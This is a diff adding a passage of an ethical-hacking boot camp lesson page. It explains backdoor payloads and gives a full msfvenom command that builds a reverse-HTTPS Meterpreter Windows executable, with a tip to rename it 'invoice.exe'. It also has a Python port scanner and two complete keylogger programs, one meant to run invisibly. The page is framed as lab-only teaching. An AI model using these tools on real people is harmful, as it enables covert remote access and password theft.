+        <div class="tip-text">Inside every backdoor is a piece of code called a <strong>payload</strong>. The payload is what actually gives the attacker remote access and the ability to execute commands on the target machine.</div>
+      </div>
+    </div>
+
+    <!-- SLIDE 3: Payload explained -->
+    <div class="slide">
+      <div class="slide-tag">Day 5 · Payloads</div>
+      <div class="slide-title">💣 What is a Payload?</div>
+      <div class="slide-body">
+        <p>A <strong>payload</strong> is the core code inside a backdoor or exploit that carries out the actual attack. When a victim runs an infected file, the payload executes silently in the background and connects back to the attacker's machine.</p>
+        <p>There are two main types of payloads:</p>
+      </div>
+      <div class="terms-grid">
+        <div class="term">
+          <div class="term-word">Staged Payload</div>
+          <div class="term-def">A small initial payload (stager) that runs first and then downloads the rest of the payload from the attacker's machine. Smaller file size. Example: <code style="color:#7dd3fc;">windows/meterpreter/reverse_tcp</code></div>
+        </div>
+        <div class="term">
+          <div class="term-word">Stageless Payload</div>
+          <div class="term-def">The entire payload is packed into one file — no need to download anything extra. Bigger file but works without an active connection during delivery.</div>
+        </div>
+        <div class="term">
+          <div class="term-word">Reverse Shell / Reverse TCP</div>
+          <div class="term-def">The victim's machine connects <strong>back</strong> to the attacker — this bypasses most firewalls because outgoing connections are usually allowed.</div>
+        </div>
+        <div class="term">
+          <div class="term-word">Meterpreter</div>
+          <div class="term-def">A very powerful payload from the Metasploit framework. Runs entirely in memory (no files written to disk), giving webcam, keylogger, shell access and more.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 4: msfvenom intro -->
+    <div class="slide">
+      <div class="slide-tag">Day 5 · msfvenom</div>
+      <div class="slide-title">⚗️ What is msfvenom?</div>
+      <div class="slide-body">
+        <p><strong>msfvenom</strong> is a Kali Linux tool from the Metasploit Framework. It lets you <strong>create custom payloads</strong> — you choose the target OS, the type of connection, your IP address, a port, and the file format. msfvenom packages it all into a single file (e.g. a .exe) that you can use in a client-side attack.</p>
+        <p>It replaced the older <code style="color:#7dd3fc;font-family:monospace;">msfpayload</code> and <code style="color:#7dd3fc;font-family:monospace;">msfencode</code> tools and combines both into one command.</p>
+      </div>
+      <div class="vis-grid">
+        <div class="vis-card"><div class="vis-icon">🎯</div><div class="vis-label">Choose Target</div><div class="vis-desc">Windows, Linux, Android, macOS — pick the victim OS.</div></div>
+        <div class="vis-card"><div class="vis-icon">📡</div><div class="vis-label">Set Your IP</div><div class="vis-desc">LHOST = your Kali IP. The payload calls back to you.</div></div>
+        <div class="vis-card"><div class="vis-icon">🔌</div><div class="vis-label">Set Port</div><div class="vis-desc">LPORT = the port you'll listen on (e.g. 8080).</div></div>
+        <div class="vis-card"><div class="vis-icon">📄</div><div class="vis-label">Choose Format</div><div class="vis-desc">Output as .exe, .apk, .py, .php and many more.</div></div>
+      </div>
+    </div>
+
+    <!-- SLIDE 5: List payloads -->
+    <div class="slide">
+      <div class="slide-tag">Day 5 · msfvenom · Step 1</div>
+      <div class="slide-title">📋 Step 1 — List Available Payloads</div>
+      <div class="slide-body">
+        <p>First, open your Kali terminal and list all available payloads so you can pick the right one for your target. There are hundreds of options for different operating systems and connection types.</p>
+      </div>
+      <div class="code-lang">kali terminal — step 1</div>
+      <div class="code-block"><pre><span class="cm"># List ALL available payloads</span>
+msfvenom --list payloads
+
+<span class="cm"># Too many? Filter for Windows only</span>
+msfvenom --list payloads | grep windows
+
+<span class="cm"># Filter for meterpreter payloads only</span>
+msfvenom --list payloads | grep meterpreter</pre></div>
+      <div class="screenshot-box">
+        <div class="ss-label">📸 What you'll see — payload list output</div>
+        <div class="ss-content">
+          <div class="ss-row"><span class="ss-path">windows/x64/vncinject/reverse_tcp</span><span class="ss-desc">Inject a VNC Dll via reflective loader (staged, connects back)</span></div>
+          <div class="ss-row"><span class="ss-path">windows/x64/vncinject/reverse_tcp_uuid</span><span class="ss-desc">Same but with UUID support</span></div>
+          <div class="ss-row"><span class="ss-path">windows/meterpreter/reverse_tcp</span><span class="ss-desc">Meterpreter shell — reverse TCP connection</span></div>
+          <div class="ss-row"><span class="ss-path">windows/meterpreter/reverse_https</span><span class="ss-desc">Meterpreter shell — encrypted HTTPS connection (harder to detect)</span></div>
+        </div>
+      </div>
+      <div class="tip-box">
+        <div class="tip-icon">💡</div>
+        <div class="tip-text">We will use <strong>windows/meterpreter/reverse_https</strong> — this uses HTTPS (port 443 traffic) which looks like normal web browsing, making it harder for antivirus to detect.</div>
+      </div>
+    </div>
+
+    <!-- SLIDE 6: Find your IP -->
+    <div class="slide">
+      <div class="slide-tag">Day 5 · msfvenom · Step 2</div>
+      <div class="slide-title">🌐 Step 2 — Find Your Kali IP Address</div>
+      <div class="slide-body">
+        <p>Before creating the payload, you need to know your <strong>Kali machine's IP address</strong>. This is the <strong>LHOST</strong> (Local Host) — the address the victim's machine will call back to when the payload runs.</p>
+      </div>
+      <div class="code-lang">kali terminal — step 2</div>
+      <div class="code-block"><pre><span class="cm"># Run ifconfig to see your network interfaces</span>
+ifconfig
+
+<span class="cm"># Look for the "inet" line under eth0 or ens33</span>
+<span class="cm"># Example output:</span>
+<span class="cm"># eth0: inet 192.168.152.134  netmask 255.255.255.0</span></pre></div>
+      <div class="screenshot-box">
+        <div class="ss-label">📸 ifconfig output — find your inet IP</div>
+        <div class="ss-content" style="font-family:monospace;font-size:11.5px;color:#86efac;line-height:1.8;">
+          <div>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500</div>
+          <div>&nbsp;&nbsp;&nbsp;&nbsp;<span style="background:rgba(34,197,94,0.2);padding:1px 6px;border-radius:4px;">inet <strong style="color:#fff;">192.168.152.134</strong></span>&nbsp; netmask 255.255.255.0 &nbsp; broadcast 192.168.152.255</div>
+        </div>
+      </div>
+      <div class="tip-box">
+        <div class="tip-icon">📌</div>
+        <div class="tip-text">Write down your IP. In this demo the Kali IP is <strong>192.168.152.134</strong>. Yours will be different — always run <code style="font-family:monospace;">ifconfig</code> to get yours fresh each session.</div>
+      </div>
+    </div>
+
+    <!-- SLIDE 7: Create the payload -->
+    <div class="slide">
+      <div class="slide-tag">Day 5 · msfvenom · Step 3</div>
+      <div class="slide-title">⚗️ Step 3 — Create the Backdoor Payload</div>
+      <div class="slide-body">
+        <p>Now we create the payload using msfvenom. We package it as a <strong>.exe file</strong> — when a Windows victim runs this file, it connects back to our Kali machine and gives us full control.</p>
+      </div>
+      <div class="code-lang">kali terminal — step 3 (the full command)</div>
+      <div class="code-block"><pre>msfvenom <span class="kw">-p</span> windows/meterpreter/reverse_https \
+         <span class="kw">LHOST=</span><span class="str">192.168.152.134</span> \
+         <span class="kw">LPORT=</span><span class="str">8080</span> \
+         <span class="kw">-f</span> exe \
+         <span class="kw">-o</span> hey.exe</pre></div>
+      <div class="terms-grid" style="margin-top:16px;">
+        <div class="term"><div class="term-word">-p windows/meterpreter/reverse_https</div><div class="term-def">The payload we chose — Meterpreter over HTTPS, targeting Windows.</div></div>
+        <div class="term"><div class="term-word">LHOST=192.168.152.134</div><div class="term-def">Your Kali IP address — where the victim will connect back to.</div></div>
+        <div class="term"><div class="term-word">LPORT=8080</div><div class="term-def">The port you'll listen on. 8080 is common and often allowed by firewalls.</div></div>
+        <div class="term"><div class="term-word">-f exe</div><div class="term-def">Output format — we want a Windows executable (.exe) file.</div></div>
+        <div class="term"><div class="term-word">-o hey.exe</div><div class="term-def">Output file name — the backdoor will be saved as "hey.exe".</div></div>
+      </div>
+    </div>
+
+    <!-- SLIDE 8: Output result -->
+    <div class="slide">
+      <div class="slide-tag">Day 5 · msfvenom · Step 4</div>
+      <div class="slide-title">✅ Step 4 — Payload Created Successfully</div>
+      <div class="slide-body">
+        <p>After running the command, msfvenom will process and generate your backdoor file. Here's what the output looks like:</p>
+      </div>
+      <div class="screenshot-box">
+        <div class="ss-label">📸 msfvenom output — payload generated</div>
+        <div class="ss-content" style="font-family:monospace;font-size:11.5px;line-height:1.9;">
+          <div style="color:#94a3b8;">[-] No platform was selected, choosing Msf::Module::Platform::Windows</div>
+          <div style="color:#94a3b8;">[-] No arch selected, selecting arch: x86 from the payload</div>
+          <div style="color:#94a3b8;">No encoder specified, outputting raw payload</div>
+          <div style="color:#86efac;">Payload size: <strong style="color:#fff;">608 bytes</strong></div>
+          <div style="color:#86efac;">Final size of exe file: <strong style="color:#fff;">73802 bytes</strong></div>
+          <div style="color:#86efac;">Saved as: <strong style="color:#fff;">hey.exe</strong></div>
+        </div>
+      </div>
+      <div class="tip-box">
+        <div class="tip-icon">🎯</div>
+        <div class="tip-text">The file <strong>hey.exe</strong> is now in your current directory. The payload itself is only 608 bytes — but msfvenom wraps it in a full Windows executable making it 73,802 bytes total. In a real pen test you'd rename this to something convincing like "invoice.exe" or "setup.exe".</div>
+      </div>
+      <div class="warn-box">
+        <div class="warn-icon">⚠️</div>
+        <div class="warn-text">This file will be <strong>flagged by antivirus</strong> software immediately on a real machine. Advanced pen testers use encoders and obfuscation to bypass AV — that's a more advanced topic beyond this boot camp.</div>
+      </div>
+    </div>
+
+    <!-- SLIDE 9: Video Demo -->
+    <div class="slide">
+      <div class="slide-tag">Day 5 · Live Demo</div>
+      <div class="slide-title">🎬 Watch the Full Demo</div>
+      <div class="slide-body">
+        <p>Watch the full attack demonstration below — performed on the instructor's <strong>own virtual machine</strong> in a safe, isolated lab environment. This shows the complete process from creating the payload to gaining remote access.</p>
+        <p>Pay attention to how the payload connects back, and what Meterpreter allows you to do once the session is open.</p>
+      </div>
+      <a class="link-card" href="https://youtu.be/JUyt_eJoLLo?si=C-_J0VN1jW_fRlCm" target="_blank">
+        <div class="link-icon">▶️</div>
+        <div class="link-info">
+          <div class="link-title">Backdoor Demo — Full Walkthrough</div>
+          <div class="link-url">youtube.com · Performed on instructor's own VM · Educational only</div>
+        </div>
+        <div class="link-arr">›</div>
+      </a>
+      <div class="warn-box">
+        <div class="warn-icon">🔒</div>
+        <div class="warn-text">This demonstration was performed on the <strong>instructor's own computer running inside VMware</strong>. It is 100% legal. Never replicate this on any device you do not own.</div>
+      </div>
+    </div>
+
+    <!-- SLIDE: PORT SCANNER -->
+    <div class="slide" style="border-color:rgba(34,197,94,0.3);">
+      <div class="slide-tag" style="color:#86efac;">🔍 Bonus Project 1 · Python Port Scanner</div>
+      <div class="slide-title">🌐 Bonus: Build a Python Port & Vulnerability Scanner</div>
+      <div class="slide-body">
+        <p>A <strong>port scanner</strong> discovers which network ports are open on a target machine. Open ports reveal running services — web server, SSH, FTP, database — and each is a potential entry point for an attacker. Tools like Nmap do this — here we build our own in Python so you understand exactly what happens at the network level.</p>
+      </div>
+      <div class="vis-grid">
+        <div class="vis-card"><div class="vis-icon">🔌</div><div class="vis-label">What is a Port?</div><div class="vis-desc">A virtual door (numbers 0–65535). Each service listens on a specific port number.</div></div>
+        <div class="vis-card"><div class="vis-icon">🚪</div><div class="vis-label">Open Port</div><div class="vis-desc">A service is actively listening and accepting connections here.</div></div>
+        <div class="vis-card"><div class="vis-icon">🔒</div><div class="vis-label">Closed Port</div><div class="vis-desc">No service listening — connection refused immediately.</div></div>
+        <div class="vis-card"><div class="vis-icon">🧱</div><div class="vis-label">Filtered Port</div><div class="vis-desc">Firewall blocking — no response, connection times out.</div></div>
+      </div>
+    </div>
+
+    <div class="slide" style="border-color:rgba(34,197,94,0.2);">
+      <div class="slide-tag" style="color:#86efac;">Port Scanner · Common Ports</div>
+      <div class="slide-title">📋 Common Ports & Their Risk Levels</div>
+      <div class="terms-grid">
+        <div class="term"><div class="term-word">Port 21 — FTP</div><div class="term-def">File Transfer. Often has weak passwords. Credentials sent unencrypted.</div></div>
+        <div class="term"><div class="term-word">Port 22 — SSH</div><div class="term-def">Secure remote terminal. Open SSH = can attempt brute-force login.</div></div>
+        <div class="term"><div class="term-word">Port 23 — Telnet ⚠️</div><div class="term-def">Unencrypted remote login. Everything including passwords sent in plain text. Never use.</div></div>
+        <div class="term"><div class="term-word">Port 80 — HTTP</div><div class="term-def">Unencrypted web server. Traffic can be intercepted with a MITM attack.</div></div>
+        <div class="term"><div class="term-word">Port 445 — SMB ⚠️</div><div class="term-def">Windows file sharing. Exploited by WannaCry/EternalBlue ransomware. Should NEVER be internet-facing.</div></div>
+        <div class="term"><div class="term-word">Port 3306 — MySQL ⚠️</div><div class="term-def">Database. If open to the internet — catastrophic misconfiguration. Databases must never be public.</div></div>
+        <div class="term"><div class="term-word">Port 3389 — RDP ⚠️</div><div class="term-def">Windows Remote Desktop. Commonly brute-forced. Major attack vector.</div></div>
+      </div>
+    </div>
+
+    <div class="slide" style="border-color:rgba(34,197,94,0.2);">
+      <div class="slide-tag" style="color:#86efac;">Port Scanner · Simple Version</div>
+      <div class="slide-title">📝 Simple Port Scanner Code</div>
+      <div class="slide-body"><p>No extra libraries needed — just Python's built-in <strong>socket</strong> module.</p></div>
+      <div class="code-lang" style="color:#86efac;">python — port_scanner.py</div>
+      <div class="code-block"><pre><span class="cm"># Simple Port Scanner — TechCamp Bonus
+# Only scan your OWN machine or with permission!</span>
+
+<span class="kw">import</span> socket
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime
+
+<span class="kw">def</span> <span class="fn">scan_port</span>(ip, port, timeout=<span class="num">0.5</span>):
+    <span class="kw">try</span>:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        result = sock.connect_ex((ip, port))
+        sock.close()
+        <span class="kw">return</span> result == <span class="num">0</span>  <span class="cm"># 0 = connected = OPEN</span>
+    <span class="kw">except</span>:
+        <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="kw">def</span> <span class="fn">scan_range</span>(ip, start, end):
+    <span class="fn">print</span>(<span class="str">f"\n🔍 Scanning {ip} — Ports {start}-{end}"</span>)
+    <span class="fn">print</span>(<span class="str">f"Started: {datetime.now().strftime('%H:%M:%S')}"</span>)
+    <span class="fn">print</span>(<span class="str">"-" * 35</span>)
+    open_ports = []
+    <span class="kw">for</span> port <span class="kw">in</span> <span class="fn">range</span>(start, end + <span class="num">1</span>):
+        <span class="kw">if</span> <span class="fn">scan_port</span>(ip, port):
+            open_ports.append(port)
+            <span class="fn">print</span>(<span class="str">f"  ✅ Port {port:5} — OPEN"</span>)
+    <span class="fn">print</span>(<span class="str">"-" * 35</span>)
+    <span class="fn">print</span>(<span class="str">f"Found {len(open_ports)} open port(s)"</span>)
+
+<span class="cm"># Scan your own machine safely</span>
+<span class="fn">scan_range</span>(<span class="str">"127.0.0.1"</span>, <span class="num">1</span>, <span class="num">1024</span>)</pre></div>
+      <div class="code-explain">
+        <div class="ce-row"><div class="ce-code">connect_ex((ip, port))</div><div class="ce-desc">Attempts TCP connection. Returns 0 if open, non-zero if closed/filtered.</div></div>
+        <div class="ce-row"><div class="ce-code">settimeout(0.5)</div><div class="ce-desc">Wait max 0.5s per port. Lower = faster scans but may miss filtered ports.</div></div>
+        <div class="ce-row"><div class="ce-code">127.0.0.1</div><div class="ce-desc">Localhost — your own machine. Always safe to scan.</div></div>
+      </div>
+    </div>
+
+    <div class="slide" style="border-color:rgba(34,197,94,0.2);">
+      <div class="slide-tag" style="color:#86efac;">Port Scanner · Advanced Version</div>
+      <div class="slide-title">🔍 Advanced Scanner — Service + Vulnerability Detection</div>
+      <div class="slide-body"><p>This version identifies the service on each port, grabs service banners, and flags high-risk ports automatically.</p></div>
+      <div class="code-lang" style="color:#86efac;">python — advanced_scanner.py</div>
+      <div class="code-block"><pre><span class="kw">import</span> socket
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime
+
+SERVICES = {
+    <span class="num">21</span>:<span class="str">"FTP"</span>, <span class="num">22</span>:<span class="str">"SSH"</span>, <span class="num">23</span>:<span class="str">"Telnet ⚠"</span>,
+    <span class="num">25</span>:<span class="str">"SMTP"</span>, <span class="num">53</span>:<span class="str">"DNS"</span>, <span class="num">80</span>:<span class="str">"HTTP"</span>,
+    <span class="num">443</span>:<span class="str">"HTTPS"</span>, <span class="num">445</span>:<span class="str">"SMB ⚠"</span>,
+    <span class="num">3306</span>:<span class="str">"MySQL ⚠"</span>, <span class="num">3389</span>:<span class="str">"RDP ⚠"</span>,
+    <span class="num">5900</span>:<span class="str">"VNC ⚠"</span>, <span class="num">8080</span>:<span class="str">"HTTP-Alt"</span>
+}
+HIGH_RISK = [<span class="num">21</span>, <span class="num">23</span>, <span class="num">135</span>, <span class="num">139</span>, <span class="num">445</span>, <span class="num">3306</span>, <span class="num">3389</span>, <span class="num">5900</span>]
+
+<span class="kw">def</span> <span class="fn">grab_banner</span>(ip, port):
+    <span class="kw">try</span>:
+        s = socket.socket(); s.settimeout(<span class="num">1</span>)
+        s.connect((ip, port))
+        banner = s.recv(<span class="num">1024</span>).decode(<span class="str">"utf-8"</span>, errors=<span class="str">"ignore"</span>).strip()
+        s.close(); <span class="kw">return</span> banner[:<span class="num">70</span>]
+    <span class="kw">except</span>: <span class="kw">return</span> <span class="kw">None</span>
+
+<span class="kw">def</span> <span class="fn">scan</span>(ip, ports):
+    <span class="fn">print</span>(<span class="str">f"\n🔍 Scanning: {ip}  ({datetime.now().strftime('%H:%M:%S')})\n"</span>)
+    open_ports = []
+    <span class="kw">for</span> port <span class="kw">in</span> ports:
+        <span class="kw">try</span>:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(<span class="num">0.5</span>)
+            <span class="kw">if</span> s.connect_ex((ip, port)) == <span class="num">0</span>:
+                open_ports.append(port)
+                svc = SERVICES.get(port, <span class="str">"Unknown"</span>)
+                risk = <span class="str">" ← HIGH RISK"</span> <span class="kw">if</span> port <span class="kw">in</span> HIGH_RISK <span class="kw">else</span> <span class="str">""</span>
+                <span class="fn">print</span>(<span class="str">f"  ✅ {port:<span class="num">5</span>} {svc}{risk}"</span>)
+                banner = <span class="fn">grab_banner</span>(ip, port)
+                <span class="kw">if</span> banner: <span class="fn">print</span>(<span class="str">f"       └ {banner}"</span>)
+            s.close()
+        <span class="kw">except</span>: <span class="kw">pass</span>
+
+    risky = [p <span class="kw">for</span> p <span class="kw">in</span> open_ports <span class="kw">if</span> p <span class="kw">in</span> HIGH_RISK]
+    <span class="fn">print</span>(<span class="str">f"\n📊 {len(open_ports)} open  |  {len(risky)} high-risk"</span>)
+    <span class="kw">if</span> risky:
+        <span class="fn">print</span>(<span class="str">f"⚠️  High-risk ports open: {risky}"</span>)
+        <span class="fn">print</span>(<span class="str">"   → Firewall or close these immediately!"</span>)
+
+<span class="fn">scan</span>(<span class="str">"127.0.0.1"</span>, <span class="fn">list</span>(SERVICES.keys()))</pre></div>
+      <div class="code-explain">
+        <div class="ce-row"><div class="ce-code">SERVICES dict</div><div class="ce-desc">Maps port → service name so results are human-readable.</div></div>
+        <div class="ce-row"><div class="ce-code">grab_banner()</div><div class="ce-desc">Reads first bytes from open port — services often announce their version here (e.g. "SSH-2.0-OpenSSH").</div></div>
+        <div class="ce-row"><div class="ce-code">HIGH_RISK list</div><div class="ce-desc">Ports that should never be open publicly — FTP, Telnet, SMB, RDP, MySQL, VNC.</div></div>
+      </div>
+      <div class="warn-box">
+        <div class="warn-icon">⚠️</div>
+        <div class="warn-text"><strong>Legal reminder:</strong> Only scan <strong>127.0.0.1</strong> (your machine) or your own VM. Scanning any external IP without explicit written permission is illegal worldwide. Stay in your lab!</div>
+      </div>
+    </div>
+
+    <!-- SLIDE: BONUS KEYLOGGER -->
+    <div class="slide" style="border-color:rgba(251,191,36,0.3);">
+      <div class="slide::before" style="background:linear-gradient(90deg,#fbbf24,#ef4444);"></div>
+      <div class="slide-tag" style="color:#fbbf24;">🎁 Bonus Project 2 · Python Keylogger</div>
+      <div class="slide-title">⌨️ Bonus: Build a Keylogger with Python</div>
+      <div class="slide-body">
+        <p>A <strong>keylogger</strong> is a program that records every key pressed on a keyboard — secretly. Attackers use them to steal passwords. In this bonus we build one ourselves in Python to understand exactly how they work — and how to defend against them.</p>
+        <p>We build <strong>two versions</strong>: a simple no-GUI version, and a professional GUI version with a start/stop button.</p>
+      </div>
+      <div class="warn-box">
+        <div class="warn-icon">🚨</div>
+        <div class="warn-text"><strong>For educational purposes only.</strong> Running a keylogger on someone else's computer without consent is illegal everywhere. Only test on your own machine.</div>
+      </div>
+    </div>
+
+    <div class="slide" style="border-color:rgba(251,191,36,0.2);">
+      <div class="slide-tag" style="color:#fbbf24;">Bonus · Step 1</div>
+      <div class="slide-title">📦 Install Required Libraries</div>
+      <div class="slide-body"><p>We need two libraries. Open your <strong>terminal</strong> (Command Prompt or VS Code terminal) and run these:</p></div>
+      <div class="code-lang" style="color:#fbbf24;">terminal — install libraries</div>
+      <div class="code-block"><pre><span class="cm"># Install pynput — for reading keyboard events</span>
+pip install pynput
+
+<span class="cm"># tkinter is built into Python — usually no install needed</span>
+<span class="cm"># If you get errors on Linux, run:</span>
+<span class="cm"># sudo apt install python3-tk</span></pre></div>
+      <div class="terms-grid">
+        <div class="term"><div class="term-word">pynput</div><div class="term-def">A Python library that lets you listen to and control keyboard and mouse input. Used for keyloggers, macros and automation.</div></div>
+        <div class="term"><div class="term-word">tkinter</div><div class="term-def">Python's built-in GUI library. Lets you create windows, buttons, labels and forms. Comes pre-installed with Python.</div></div>
+      </div>
+    </div>
+
+    <div class="slide" style="border-color:rgba(251,191,36,0.2);">
+      <div class="slide-tag" style="color:#fbbf24;">Bonus · Version 1</div>
+      <div class="slide-title">⌨️ Simple Keylogger — No GUI</div>
+      <div class="slide-body"><p>The simplest version — runs silently in the background, logs every key to a text file. No window, no buttons — completely invisible.</p></div>
+      <div class="code-lang" style="color:#fbbf24;">python — keylogger_simple.py</div>
+      <div class="code-block"><pre><span class="kw">from</span> pynput <span class="kw">import</span> keyboard
+
+log_file = <span class="str">"keylogs.txt"</span>
+
+<span class="kw">def</span> <span class="fn">on_press</span>(key):
+    <span class="kw">try</span>:
+        <span class="cm"># Regular character key (a, b, c, 1, 2 ...)</span>
+        <span class="kw">with</span> <span class="fn">open</span>(log_file, <span class="str">"a"</span>) <span class="kw">as</span> f:
+            f.write(<span class="str">f"{key.char}"</span>)
+    <span class="kw">except</span> AttributeError:
+        <span class="cm"># Special key (Enter, Space, Backspace, Shift ...)</span>
+        <span class="kw">with</span> <span class="fn">open</span>(log_file, <span class="str">"a"</span>) <span class="kw">as</span> f:
+            f.write(<span class="str">f"[{key}]"</span>)
+
+<span class="cm"># Start listening — runs until manually stopped</span>
+<span class="kw">with</span> keyboard.Listener(on_press=on_press) <span class="kw">as</span> listener:
+    listener.join()</pre></div>
+      <div class="code-block" style="margin-top:8px;"><pre><span class="cm"># View captured keystrokes in terminal:</span>
+cat keylogs.txt</pre></div>
+      <div class="code-explain">
+        <div class="ce-row"><div class="ce-code">on_press(key)</div><div class="ce-desc">Called automatically every time a key is pressed. The key object holds what was pressed.</div></div>
+        <div class="ce-row"><div class="ce-code">key.char</div><div class="ce-desc">The character value of a normal key (e.g. 'a', '5'). Raises AttributeError for special keys.</div></div>
+        <div class="ce-row"><div class="ce-code">except AttributeError</div><div class="ce-desc">Catches special keys like [Enter], [shift], [ctrl] and logs them with brackets around them.</div></div>
+        <div class="ce-row"><div class="ce-code">keyboard.Listener</div><div class="ce-desc">Starts a background thread that listens for keyboard events and calls on_press for each.</div></div>
+      </div>
+    </div>
+
+    <div class="slide" style="border-color:rgba(251,191,36,0.2);">
+      <div class="slide-tag" style="color:#fbbf24;">Bonus · Version 2</div>
+      <div class="slide-title">🖥️ Professional Keylogger — With GUI</div>
+      <div class="slide-body"><p>A more advanced version with a <strong>tkinter window</strong> showing the logger is active, a quit button, and timestamps for every keystroke so you know exactly when each key was pressed.</p></div>
+      <div class="code-lang" style="color:#fbbf24;">python — keylogger_gui.py</div>
+      <div class="code-block"><pre><span class="kw">from</span> pynput <span class="kw">import</span> keyboard
+<span class="kw">import</span> tkinter <span class="kw">as</span> tk
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime
+
+log_file = <span class="str">"key_log.txt"</span>
+
+<span class="kw">def</span> <span class="fn">on_press</span>(key):
+    timestamp = datetime.now().strftime(<span class="str">"%Y-%m-%d %H:%M:%S"</span>)
+    <span class="kw">try</span>:
+        entry = <span class="str">f"{timestamp} - {key.char}\n"</span>
+    <span class="kw">except</span> AttributeError:
+        entry = <span class="str">f"{timestamp} - [{key}]\n"</span>
+    <span class="kw">with</span> <span class="fn">open</span>(log_file, <span class="str">"a"</span>) <span class="kw">as</span> f:
+        f.write(entry)
+
+<span class="kw">def</span> <span class="fn">start_keylogger</span>():
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+<span class="kw">def</span> <span class="fn">build_gui</span>():
+    window = tk.Tk()
+    window.title(<span class="str">"Keylogger"</span>)
+    window.geometry(<span class="str">"300x150"</span>)
+
+    label = tk.Label(window, text=<span class="str">"Keylogger Running..."</span>,
+                     font=(<span class="str">"Arial"</span>, <span class="num">12</span>))
+    label.pack(pady=<span class="num">20</span>)
+
+    log_label = tk.Label(window, text=<span class="str">f"Saving to: {log_file}"</span>,
+                         font=(<span class="str">"Arial"</span>, <span class="num">9</span>), fg=<span class="str">"grey"</span>)
+    log_label.pack()
+
+    btn = tk.Button(window, text=<span class="str">"Quit"</span>, command=window.destroy,
+                    bg=<span class="str">"red"</span>, fg=<span class="str">"white"</span>, font=(<span class="str">"Arial"</span>, <span class="num">10</span>))
+    btn.pack(pady=<span class="num">10</span>)
+
+    <span class="fn">start_keylogger</span>()
+    window.mainloop()
+
+<span class="fn">build_gui</span>()</pre></div>
+      <div class="code-block" style="margin-top:8px;"><pre><span class="cm"># View captured keystrokes with timestamps:</span>
+cat key_log.txt
+
+<span class="cm"># Example output in key_log.txt:</span>
+<span class="cm"># 2026-04-07 14:32:01 - h</span>
+<span class="cm"># 2026-04-07 14:32:01 - e</span>
+<span class="cm"># 2026-04-07 14:32:02 - l</span>
+<span class="cm"># 2026-04-07 14:32:02 - l</span>
+<span class="cm"># 2026-04-07 14:32:02 - o</span>
+<span class="cm"># 2026-04-07 14:32:03 - [Key.space]</span></pre></div>
+    </div>
+
+    <div class="slide" style="border-color:rgba(251,191,36,0.2);">
+      <div class="slide-tag" style="color:#fbbf24;">Bonus · Video Demo</div>
+      <div class="slide-title">🎬 Watch the Full Keylogger Demo</div>
+      <div class="slide-body"><p>Watch the complete walkthrough — building and running both keylogger versions, seeing the output file and understanding how it all works together.</p></div>
+      <a class="link-card" href="https://youtu.be/H-LqUG4j_4w?si=3QqoH7fIcB30Fc-M" target="_blank">
+        <div class="link-icon">▶️</div>
+        <div class="link-info">
+          <div class="link-title">Python Keylogger — Full Demo Video</div>
+          <div class="link-url">youtube.com · Educational demo · Both GUI and no-GUI versions</div>
+        </div>
+        <div class="link-arr">›</div>
+      </a>
+      <div class="warn-box">
+        <div class="warn-icon">🔒</div>
+        <div class="warn-text">Now that you know how keyloggers work, you understand why: <strong>never type passwords on a computer you don't trust</strong>, always use a password manager, and always run antivirus software. This is the value of ethical hacking — understanding attacks helps you defend against them.</div>
+      </div>
+    </div>
+
+    <!-- SLIDE 10: Full week summary -->
+    <div class="slide">
+      <div class="slide-tag">Day 5 · Week Wrap-Up</div>
+      <div class="slide-title">✅ Week 1 Complete — Full Summary</div>
+      <div class="slide-body"><p>Here's everything you've covered this week:</p></div>
+      <div class="steps">
+        <div class="step"><div class="step-num">✓</div><div class="step-text">What ethical hacking is and the types of hackers (black/white/grey hat)</div></div>
+        <div class="step"><div class="step-num">✓</div><div class="step-text">The 5 phases of ethical hacking — recon → scanning → exploit → maintain → report</div></div>
+        <div class="step"><div class="step-num">✓</div><div class="step-text">Set up VMware and Kali Linux virtual machine</div></div>
+        <div class="step"><div class="step-num">✓</div><div class="step-text">Terminal commands and navigating Kali</div></div>
+        <div class="step"><div class="step-num">✓</div><div class="step-text">Networking basics — IP, ports, MAC address, how networks work</div></div>
+        <div class="step"><div class="step-num">✓</div><div class="step-text">Scanning with Nmap and reconnaissance tools</div></div>
+        <div class="step"><div class="step-num">✓</div><div class="step-text">Client-side attacks — what they are and how they work</div></div>
+        <div class="step"><div class="step-num">✓</div><div class="step-text">Backdoors and payloads — how remote access tools work</div></div>
+        <div class="step"><div class="step-num">✓</div><div class="step-text">Creating a payload with msfvenom and understanding every flag</div></div>
+      </div>
+    </div>
+
+    <div class="lesson-nav">
+      <div class="nav-btn" onclick="showDay(4)">← Day 4</div>
+      <a class="nav-btn primary" href="week2.html" style="text-decoration:none;display:flex;align-items:center;justify-content:center;">Week 2: Arduino & Pi →</a>
+    </div>
+  </div>
+
+  <footer>TechCamp Boot Camp · Week 1 · Ethical Hacking Fundamentals</footer>
+</div>
+
+<script>
+  function showDay(n) {
+    document.querySelectorAll('.lesson').forEach(l => l.classList.remove('active'));
+    document.querySelectorAll('.p-day').forEach(d => d.classList.remove('active'));
+    document.getElementById('day' + n).classList.add('active');
+    document.querySelectorAll('.p-day')[n - 1].classList.add('active');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+</script>
+</body>
+</html>
